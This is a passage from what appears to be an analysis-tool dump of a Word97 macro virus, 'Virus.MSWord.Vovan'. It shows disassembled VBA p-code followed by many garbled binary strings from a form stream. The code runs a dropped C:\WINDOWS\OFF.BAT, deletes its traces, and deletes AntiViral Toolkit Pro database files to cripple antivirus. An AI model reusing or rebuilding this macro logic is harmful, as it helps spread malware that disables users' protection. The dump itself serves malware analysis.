' 	PrintItemNL 
' Line #205:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #206:
' 	LitStr 0x000B "C:\WINDOWS\"
' 	ArgsCall ChDir 0x0001 
' Line #207:
' 	LitStr 0x0012 "C:\WINDOWS\OFF.BAT"
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #208:
' 	Dim 
' 	VarDefn PauseTime
' 	VarDefn Start
' 	VarDefn Finish
' Line #209:
' 	LitDI2 0x000A 
' 	St PauseTime 
' Line #210:
' 	Ld Timer 
' 	St Start 
' Line #211:
' 	Ld Timer 
' 	Ld Start 
' 	Ld PauseTime 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #212:
' 	ArgsCall DoEvents 0x0000 
' Line #213:
' 	Loop 
' Line #214:
' 	Ld Timer 
' 	St Finish 
' Line #215:
' 	LitStr 0x000B "C:\WINDOWS\"
' 	ArgsCall ChDir 0x0001 
' Line #216:
' 	LitStr 0x0012 "C:\WINDOWS\OFF.BAT"
' 	ArgsCall Kill 0x0001 
' Line #217:
' 	LitStr 0x0012 "C:\WINDOWS\OFF.SCR"
' 	ArgsCall Kill 0x0001 
' Line #218:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError AVP 
' Line #219:
' 	LitStr 0x002C "C:\Program Files\AntiViral Toolkit Pro\*.avc"
' 	ArgsCall Kill 0x0001 
' Line #220:
' 	LitStr 0x001B "Дума отправлена в отставку!"
' 	St StatusBar 
' Line #221:
' 	Label AVP 
' Line #222:
' 	End 
' Line #223:
' 	EndSub 
' Line #224:
' 	QuoteRem 0x0000 0x0027 "***************************************"
' Line #225:
' 	QuoteRem 0x0000 0x0027 "* Author of given MacroVirus is VOVAN *"
' Line #226:
' 	QuoteRem 0x0000 0x0027 "*         MacroVirus.Word97           *"
' Line #227:
' 	QuoteRem 0x0000 0x0027 "*      Name of President virus        *"
' Line #228:
' 	QuoteRem 0x0000 0x0027 "*             Ver 1.0                 *"
' Line #229:
' 	QuoteRem 0x0000 0x0027 "***************************************"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&81;:7165=EXK=ATB56MiNT[^cdc<Jltl`sXac_��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-_?6?__________________________________________________��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�2�}_O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Χ5�k�����G'C�x���X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@t��x��q,�.�j�+@�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U��ͯ�=���πP
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g#%JWj�c�=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���kګ�e�w��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-SHV�(�'Ap2�2�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7;5�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���5��d]δ]Y��d�	�rY��dkd\�CV=9�
��lu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ưڭ�=4�V�ԣ>�c$�2X����wY��o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]��oS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�sb�>��T���"�}�י#�K�/��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"1A#04
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23BC��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mu�*kI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pc�h<?����z]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}z�MR��^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�gl��DSy��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;p�z�I9?C	�R�S��1j~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A��2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y�l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<{�����e��'/x����K���V[�F�)�����c��r	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�ş�#�c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.lb��/���F��e:�F'+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�2�j�ԫ�.���(�ӂ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4�8��U��2��8��v���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�'|��cJ��,!�'HdE�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ΣXy�rQ��e^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�ZT���9a�C5+F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�LB����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ٜgQ�ʔɨ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̕-*jp�Ñ`�Tz�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AQa"2bq��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	�O�K�QN�1�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����.wNw��M�Ld�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Np��V$�b� Ȍ�@���e�I���R:ʑ�-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9��#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ñ��UT;�%xp�x='���!q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V.9�L����yjV�螏��l�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1� d�+�
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q aq�0������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?!��Fȑ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<Q��4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����)p���U��h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ۮ�_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����q��({c�uآ��$@�F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8��<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d嵘v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Bb�dZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
˲��c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F���,��5��ñ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D�\���M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�಄5I��hIL�z h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DLjHy�ZZh�ٔ,��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`8X�QF�c�/*�Q���5-Q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� cn48��J�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�O��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T���h�
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d��Y��"��d�V\�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ƿ�c���HjlD�_�	-�1	HH�����21�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f$CbV5�F�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QG������&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ύ�Eت�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
hg���;D�р�e�k�6ОO�� ���!���VK�q�Kb
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3e��z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P���������@�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ЪQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 䥅V f��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	Tu_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�bf�(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���V,
�#	4�S��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s^���q;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1A ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Df�[̄
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|zr<!�|Cb
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���V�g�Y�n���#�a�4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N1�����9��1o�k�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1A ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�	b�P�߇�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z���88N�l!�b>�1*C`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���J&-²T59�$��a�ӂ�E���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1AQa q����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=
�kq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
͵��Ӆ�6�wY�	��	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���F�M�{�Ā
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��A�oyG���8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��gĪ-^��(~hf�&�/Upj�X��"X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����O��.J��
X-�#7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,���7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?gy��^Q �,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�������e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�0��c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�V���7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9	i����죘Qt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�;�U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>D��/��5{�*Gx ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
36F0�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r�˔�3pR�~}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��˻f-Q.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�֬���I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*G��Z=����W�/I|�PG,@&VK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6�AK7��\M%ᬤH���1Qn2��Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	���4Oj�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���l���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[0��F��)������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�͈�W2t�GA,��z��)�,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
͙�)E|���mS�.��؁d����V|D���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)3x����2s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ai�^CQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

\�Z�ޛR��ȐA͘O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
